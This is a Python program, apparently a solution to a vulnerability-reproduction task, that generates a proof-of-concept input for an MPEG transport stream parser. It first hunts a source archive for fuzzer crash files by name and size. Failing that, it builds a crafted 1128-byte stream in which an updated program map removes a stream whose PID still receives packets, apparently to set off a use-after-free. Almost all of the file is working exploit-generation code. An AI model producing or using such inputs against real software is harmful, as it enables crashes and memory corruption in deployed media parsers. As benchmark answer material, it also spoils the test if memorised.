import os
import re
import tarfile
from typing import List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        candidate = self._find_embedded_poc(src_path)
        if candidate is not None and len(candidate) > 0:
            return candidate
        return self._build_fallback_ts_poc()

    def _find_embedded_poc(self, src_path: str) -> Optional[bytes]:
        candidates: List[Tuple[int, int, str, bytes]] = []

        def score_name(name: str, size: int) -> int:
            n = name.lower()
            s = 0
            if "clusterfuzz" in n:
                s += 200
            if "testcase" in n:
                s += 120
            if "minimized" in n or "minim" in n:
                s += 80
            if "crash" in n:
                s += 120
            if "poc" in n:
                s += 100
            if "repro" in n or "reproducer" in n:
                s += 100
            if "uaf" in n or "useafterfree" in n or "use-after-free" in n:
                s += 80

            ext = os.path.splitext(n)[1]
            if ext in (".ts", ".m2ts", ".mts", ".bin", ".dat", ".raw", ".input"):
                s += 60
            if size == 1128:
                s += 80
            if size % 188 == 0 and size >= 188:
                s += 15

            if ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".md", ".rst", ".txt", ".py", ".sh", ".cmake", ".yml", ".yaml", ".json", ".xml"):
                s -= 300
            if "/doc" in n or "/docs" in n:
                s -= 50
            if "/example" in n or "/examples" in n:
                s -= 50
            return s

        def consider(name: str, data: bytes):
            size = len(data)
            if size == 0:
                return
            if size > 2_000_000:
                return
            sc = score_name(name, size)
            if sc <= 0:
                return
            candidates.append((sc, size, name, data))

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    path = os.path.join(root, fn)
                    try:
                        st = os.stat(path)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    rel = os.path.relpath(path, src_path).replace("\\", "/")
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    consider(rel, data)
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        name = (m.name or "").replace("\\", "/")
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        consider(name, data)
            except Exception:
                return None

        if not candidates:
            return None

        candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
        top_sc, top_size, top_name, top_data = candidates[0]

        if top_sc >= 150:
            return top_data

        # If nothing clearly looks like a crasher, try a more permissive pick with TS-like sizes.
        ts_like = [c for c in candidates if c[1] % 188 == 0 and c[1] <= 100_000]
        if ts_like:
            ts_like.sort(key=lambda x: (-x[0], x[1], x[2]))
            return ts_like[0][3]

        return top_data

    def _mpeg_crc32(self, data: bytes) -> int:
        crc = 0xFFFFFFFF
        poly = 0x04C11DB7
        for b in data:
            crc ^= (b & 0xFF) << 24
            for _ in range(8):
                if crc & 0x80000000:
                    crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
                else:
                    crc = (crc << 1) & 0xFFFFFFFF
        return crc & 0xFFFFFFFF

    def _build_pat_section(self, pmt_pid: int, ts_id: int = 1, program_number: int = 1, version: int = 0) -> bytes:
        section_length = 13  # 5 bytes fixed + 4 bytes per program (1) + CRC4
        hdr = bytearray()
        hdr.append(0x00)  # table_id
        hdr.append(0xB0 | ((section_length >> 8) & 0x0F))
        hdr.append(section_length & 0xFF)
        hdr.append((ts_id >> 8) & 0xFF)
        hdr.append(ts_id & 0xFF)
        hdr.append(0xC0 | ((version & 0x1F) << 1) | 0x01)  # current_next=1
        hdr.append(0x00)  # section_number
        hdr.append(0x00)  # last_section_number

        hdr.append((program_number >> 8) & 0xFF)
        hdr.append(program_number & 0xFF)
        hdr.append(0xE0 | ((pmt_pid >> 8) & 0x1F))
        hdr.append(pmt_pid & 0xFF)

        crc = self._mpeg_crc32(bytes(hdr))
        hdr.extend([(crc >> 24) & 0xFF, (crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])
        return bytes(hdr)

    def _build_pmt_section(
        self,
        program_number: int,
        pcr_pid: int,
        streams: List[Tuple[int, int]],  # list of (stream_type, elementary_pid)
        version: int = 0,
    ) -> bytes:
        program_info_length = 0
        es_info_length = 0
        fixed_after_len = 2 + 1 + 1 + 1 + 2 + 2  # prog num + ver + sec + last + pcr + prog_info_len
        streams_len = 0
        for _st, _pid in streams:
            streams_len += 1 + 2 + 2 + es_info_length
        section_length = fixed_after_len + program_info_length + streams_len + 4  # +CRC

        hdr = bytearray()
        hdr.append(0x02)  # table_id
        hdr.append(0xB0 | ((section_length >> 8) & 0x0F))
        hdr.append(section_length & 0xFF)
        hdr.append((program_number >> 8) & 0xFF)
        hdr.append(program_number & 0xFF)
        hdr.append(0xC0 | ((version & 0x1F) << 1) | 0x01)  # current_next=1
        hdr.append(0x00)  # section_number
        hdr.append(0x00)  # last_section_number
        hdr.append(0xE0 | ((pcr_pid >> 8) & 0x1F))
        hdr.append(pcr_pid & 0xFF)
        hdr.append(0xF0 | ((program_info_length >> 8) & 0x0F))
        hdr.append(program_info_length & 0xFF)

        for st, pid in streams:
            hdr.append(st & 0xFF)
            hdr.append(0xE0 | ((pid >> 8) & 0x1F))
            hdr.append(pid & 0xFF)
            hdr.append(0xF0 | ((es_info_length >> 8) & 0x0F))
            hdr.append(es_info_length & 0xFF)

        crc = self._mpeg_crc32(bytes(hdr))
        hdr.extend([(crc >> 24) & 0xFF, (crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])
        return bytes(hdr)

    def _ts_packet(self, pid: int, payload: bytes, pusi: bool, cc: int) -> bytes:
        if len(payload) > 184:
            payload = payload[:184]
        b1 = (0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)
        b2 = pid & 0xFF
        b3 = 0x10 | (cc & 0x0F)  # payload only
        header = bytes([0x47, b1, b2, b3])
        return header + payload.ljust(184, b"\xFF")

    def _build_pes(self, stream_id: int = 0xE0, payload_size: int = 32) -> bytes:
        # Minimal MPEG-2 PES header with no optional fields.
        # start_code_prefix(3)=0x000001, stream_id(1), pes_len(2)=0, flags(3)
        pes = bytearray()
        pes.extend(b"\x00\x00\x01")
        pes.append(stream_id & 0xFF)
        pes.extend(b"\x00\x00")  # length 0 => unbounded (commonly for video)
        pes.append(0x80)  # '10' + no flags
        pes.append(0x00)  # no optional flags
        pes.append(0x00)  # header_data_length
        pes.extend(b"\x00" * max(0, payload_size))
        return bytes(pes)

    def _build_fallback_ts_poc(self) -> bytes:
        PMT_PID = 0x0100
        PID_A = 0x0101
        PID_B = 0x0102

        pat = self._build_pat_section(PMT_PID, ts_id=1, program_number=1, version=0)

        # PMT1 declares two streams
        pmt1 = self._build_pmt_section(
            program_number=1,
            pcr_pid=PID_A,
            streams=[(0x1B, PID_A), (0x0F, PID_B)],
            version=0,
        )

        # PMT2 removes PID_A but keeps PID_B (forces deletion/update path)
        pmt2 = self._build_pmt_section(
            program_number=1,
            pcr_pid=PID_B,
            streams=[(0x0F, PID_B)],
            version=1,
        )

        pes1 = self._build_pes(stream_id=0xE0, payload_size=40)
        pes2 = self._build_pes(stream_id=0xE0, payload_size=40)
        pes3 = self._build_pes(stream_id=0xE0, payload_size=40)

        packets = []
        packets.append(self._ts_packet(0x0000, bytes([0x00]) + pat, True, 0))
        packets.append(self._ts_packet(PMT_PID, bytes([0x00]) + pmt1, True, 0))
        packets.append(self._ts_packet(PID_A, pes1, True, 0))
        packets.append(self._ts_packet(PMT_PID, bytes([0x00]) + pmt2, True, 1))
        packets.append(self._ts_packet(PID_A, pes2, True, 1))
        packets.append(self._ts_packet(PID_A, pes3, True, 2))

        out = b"".join(packets)
        if len(out) != 188 * 6:
            out = out[:188 * 6].ljust(188 * 6, b"\xFF")
        return out